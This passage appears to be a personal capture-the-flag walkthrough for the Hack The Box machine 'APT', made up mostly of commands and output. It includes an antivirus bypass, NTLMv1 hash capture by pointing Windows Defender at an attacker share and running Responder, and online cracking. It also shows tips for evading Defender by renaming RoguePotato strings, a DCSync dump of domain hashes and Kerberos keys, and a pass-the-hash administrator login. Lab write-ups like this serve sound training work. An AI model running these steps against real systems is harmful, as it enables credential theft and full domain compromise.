UserPrincipalName                    :
uSNChanged                           : 114726
uSNCreated                           : 8196
whenChanged                          : 4/11/2021 5:59:08 PM
whenCreated                          : 9/24/2020 8:15:43 AM
==================================================================================================================================

If we start querying things individually it will take a pretty long time so the next best thing is to use .net tools for recon
on the local machine. We will take a look a sharp collections github on google to download:
https://github.com/Flangvik/SharpCollection.git

Commands and Output:
==================================================================================================================================
git clone https://github.com/Flangvik/SharpCollection.git
┌─[user@parrot-virtual]─[~/htb/apt/backup/SharpCollection]
└──╼ $find . | grep -i peas
./NetFramework_4.0_x64/winPEAS.exe
./NetFramework_4.0_x86/winPEAS.exe
./NetFramework_4.5_Any/winPEAS.exe
./NetFramework_4.5_x64/winPEAS.exe
./NetFramework_4.5_x86/winPEAS.exe
./NetFramework_4.7_Any/winPEAS.exe
./NetFramework_4.7_x64/winPEAS.exe
./NetFramework_4.7_x86/winPEAS.exe
==================================================================================================================================

We try to run one of the collection scripts but are blocked by anitvirus software. So we run the msi bypass mechanism by saying 
we have patched our powershell version and wait for it to finish running winpeas.
Commands and Output:
==================================================================================================================================
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> Invoke-Binary /opt/SharpCollection/NetFramework_4.0_x64/winPEAS.exe
At line:1 char:1
+ Invoke-Binary TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAA ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> Bypass-4MSI
[+] Patched! :D
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> Invoke-Binary /opt/SharpCollection/NetFramework_4.0_x64/winPEAS.exe

==================================================================================================================================


Interesting finding allowing us to create directories at c:, if there is any unquoted service paths that is hardcoded to c://Program 
Files if you create the directory program it will actually go into Program instead of Program Files
Commands and Output:
==================================================================================================================================
  [+] Drives Information(T1120)
   [?] Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Volume label: System)(Filesystem: NTFS)(Available space: 26 GB)(Permissions: Users [AppendData/CreateDirectories]
==================================================================================================================================


Attached ate the firewall rules on why we could not hit the box from IPv4.
Commands and Output:
==================================================================================================================================
  [+] Firewall Rules(T1016)
   [?] Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: DOMAIN
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:
    (2147483647)Block rule[]: DENY UDP IN from *:0-65530 --> *:*
    
    (2147483647)Block rule[]: DENY TCP IN from *:0-79 --> LocalSubnet,DNS,DHCP,WINS,DefaultGateway,10.0.0.0/255.0.0.0:*
    
    (2147483647)Block rule[]: DENY TCP IN from *:81-134 --> LocalSubnet,DNS,DHCP,WINS,DefaultGateway,10.0.0.0/255.0.0.0:*
    
    (2147483647)Block rule[]: DENY TCP IN from *:136-65530 --> LocalSubnet,DNS,DHCP,WINS,DefaultGateway,10.0.0.0/255.0.0.0:*
    
    (2147483647)Block rule[]: DENY UDP IN from *:0-65530 --> *:*
==================================================================================================================================


There are other enumeration tools from the sharp collection set such as Seatbelt so we can attempt running that as  well.
Commands and Output:
==================================================================================================================================
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> Invoke-Binary /opt/SharpCollection/NetFramework_4.0_x64/Seatbelt.exe -group=all
==================================================================================================================================

We find something interesting with regards to NTLM settings
Commands and Output:
==================================================================================================================================
====== NTLMSettings ======

  LanmanCompatibilityLevel    : 2(Send NTLM response only)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : 1 (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require128BitKey)
        [!] NTLM clients support NTLMv1!
      NTLMMinServerSec        : 536870912 (Require128BitKey)

        [!] NTLM services on this machine support NTLMv1!

  NTLM Auditing and Restrictions
      InboundRestrictions     : (Not defined)
      OutboundRestrictions    : (Not defined)
      InboundAuditing         : (Not defined)
      OutboundExceptions      : 
==================================================================================================================================

It supports NTLMv1, which means it easy very easy to crack. Takes ntlm hash divides it into 3 times and does des against each, very
weak. The encrytion has a very small keyspace and the challenge response if hardcoded is vulnerable to rainbow tables.

We will force and ntlmv1 authentication, we are going to set the has to something very simple.

The hard part and magic come from modifying impacket to create an RPC server that can handle this. We will do unitended method is 
easier, Which takes advantage of windows defender in that it will provide a hash when scanning files on a network share. Microsoft
has patched this so it no longer works, but in this system it works fine.

Commands and Output:
==================================================================================================================================
*Evil-WinRM* PS C:\Program Files\Windows Defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.23\Please\test
Scan starting...
CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information

┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $sudo responder -I tun0
[sudo] password for user: 

...
...
...

[+] Listening for events...
[SMB] NTLMv1-SSP Client   : 10.10.10.213
[SMB] NTLMv1-SSP Username : HTB\APT$
[SMB] NTLMv1-SSP Hash     : APT$::HTB:40DFD3B0EE35A72500000000000000000000000000000000:7D9120A9E63D66F2939198B81AAD204761801BBB715931E0:ac0fa8e1645b6627
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
...
...
...
==================================================================================================================================

This captures the ntlv1 hash, it did not set the challenge so we have to change the responder config.
We also have to remove the newly made database as it caches previous hashes and records them if finds one from a previously responder
victim machine it will not overwrite the new hash.
Commands and Output:
==================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $sudo vim /etc/responder/Responder.conf
...
...
...
 17 ; Custom challenge.+$
 18 ; Use "Random" for generating a random challenge for each requests (Default)$
 19 ; Challenge = Random$
 20 Challenge = 112233445567788$
...
...
...
rm /usr/share/responder/Responder.db
==================================================================================================================================

Commands and Output:
==================================================================================================================================
sudo responder -I tun0 --lm
..
..
..
[+] Listening for events...
[SMB] NTLMv1-SSP Client   : 10.10.10.213
[SMB] NTLMv1-SSP Username : HTB\APT$
[SMB] NTLMv1-SSP Hash     : APT$::HTB:24C18AA2FE9B042C00000000000000000000000000000000:D58C9F2236A65D466F22DB976898250BCD8C9D02803EAAD3:1122334455667788
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
..
..
..
##### Looks like the hash is not the true one we need, we may need to run responder again with --lm ###
┌─[user@parrot-virtual]─[~/htb/apt]
└──╼ $sudo responder -I tun0 --lm
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.23]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP']

[+] Listening for events...
[SMB] NTLMv1 Client   : 10.10.10.213
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$


==================================================================================================================================

"1122334455667788" is the precomputed challenge we created to make it easier to crack. We can go to crack.sh, submit the hash
with "NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384" and submit an email address to have it send the cracked password.

After a while we get the following, for temp email address to get results back go to https://temp-mail.org/
Commands and Output:
==================================================================================================================================
Crack.sh has successfully completed its attack against your NETNTLM handshake. The NT hash for the handshake is included below, and can be plugged back into the 'chapcrack' tool to decrypt a packet capture, or to authenticate to the server:

Token: $NETNTLM$1122334455667788$95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
Key: d167c3238864b12f5f82feae86a7f798

This run took 31 seconds. Thank you for using crack.sh, this concludes your job.
==================================================================================================================================

Inorder to do the intended method we will be needing to modify impacket and we will need a windows vm to perform most of the actions
on the box. First we modify rogue potatoe, we will do this from a windows vm, we will use visual studios in order to get it to work
correctly.

We first select visual studios 2019, select project solution, go to the git clone directory of rogue potatoe, select the ".sln" 
file and open the solution. Afterwards we will modify the IstorageTrigger.cpp file as this contains this contains the remote_ip
bytes which hold the ip address we increase the number of bytes to 40 so that it can hold and process the ipv6 addresses.

Commands and Output:
==================================================================================================================================
...
...
HRESULT IStorageTrigger::MarshalInterface(IStream* pStm, const IID& riid, void* pv, DWORD dwDestContext, void* pvDestContext, DWORD mshlflags) {
	short sec_len = 8;
	//char remote_ip_mb[16];
	// We need 8 groups of 4 for abcd:abcd:abcd:abcd:abcd:abcd:abcd:abcd this is for IPv6 addresses
	char remote_ip_mb[40];
	wcstombs(remote_ip_mb, remote_ip, 16);
...
...

==================================================================================================================================

We then rebuild using the release feature and copy the rogue potatoe exe file to r.exe and create a webserver to transfer the file 
over. We then upload the file again using evil-winrm, if there are any issue uploading the file try curling it as the upload transer
might mess with the way the executable if transfered as it is utf16 little endian.

Commands and Output:
==================================================================================================================================
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> upload r.exe
Info: Uploading r.exe to C:\Users\henry.vinson_adm\Documents\r.exe

*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> ls


    Directory: C:\Users\henry.vinson_adm\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/11/2021   8:42 PM         160768 r.exe


*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> .\r.exe


	RoguePotato
	@splinter_code & @decoder_it


Mandatory args:
-r remote_ip: ip of the remote machine to use as redirector
-e commandline: commandline of the program to launch

==================================================================================================================================

If you have any issue with AV, try to replace the usage strings from rogue potatatoe and replace anyhting named rogue potatoe.
Replace anything in the project with strings including rogue potatie, replace all. If that still fails and defender still blocks
try going to right clicking on the project settings and change the optimization features from speed to smaller code and see if that
helps and rebuild.

Next thing to do is test that the rogue potato executes faithfully against using ipv6 addresses.
Commands and Output:
==================================================================================================================================
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> .\r.exe -r dead:beef:2::1015 -e cmd
[+] Starting RoguePotato...
[!] RogueOxidResolver not run locally. Ensure you run it on your remote machine
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] IStoragetrigger written:116 bytes
[-] Named pipe didn't received any connect request. Exiting ...

...
..
.

┌─[user@parrot-virtual]─[~/htb/apt/www]
└──╼ $sudo ncat -6lnvp 135
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::135
Ncat: Connection from dead:beef::b885:d62a:d679:573f.
Ncat: Connection from dead:beef::b885:d62a:d679:573f:50914.

t������`R��!4z]�����+H`����`R��!4z,�l�@E

...
..
..
==================================================================================================================================

Indeed it works. We can try and do this with responder but it will not work as it needs smb.

Now comes the hard part, editing impacket. Downloading impacket, we need to find a patch that makes impacket behave like an rpc 
server. Search impacket rpc server client
wget https://gist.githubusercontent.com/Gilks/0fc75929faba704c05143b01f34c291b/raw/e1455b82d4a7ba23998151c28abc66f7e18a8e75/rpcrelayclientserver.patch

Commands and Output:
==================================================================================================================================
==================================================================================================================================

After getting the ntlm hash and using crack.sh we are now able to secretsdump.py to authenticate to the server using dcsync
attack on the domain controller. This will effectively give us all the ntlmv2 hashes for the box.

Commands and Output:
==================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/apt]
└──╼ $ sudo !!
 sudo secretsdump.py -hashes d167c3238864b12f5f82feae86a7f798:d167c3238864b12f5f82feae86a7f798 'apt$'@apt 
[sudo] password for user: 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
==================================================================================================================================

It logs in successfully and does the dcsync, we can now use the administrator account to pass the hash and login. We attempt to use
psexec and wmiexec to login but keep encountering hangups so evil-winrm is used and we are able to login succesfully.

Commands and Output:
==================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/apt]
└──╼ $evil-winrm -i apt -u administrator -H 'c370bddf384a691d811ff3495e8a72e2'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
==================================================================================================================================

Commands and Output:
==================================================================================================================================
==================================================================================================================================

Commands and Output:
==================================================================================================================================
==================================================================================================================================

Commands and Output:
==================================================================================================================================
==================================================================================================================================

Commands and Output:
==================================================================================================================================
==================================================================================================================================

Commands and Output:
==================================================================================================================================
==================================================================================================================================

Commands and Output:
==================================================================================================================================
==================================================================================================================================

Commands and Output:
==================================================================================================================================
==================================================================================================================================

Commands and Output:
==================================================================================================================================
==================================================================================================================================

Commands and Output:
==================================================================================================================================
==================================================================================================================================

Commands and Output:
==================================================================================================================================
==================================================================================================================================
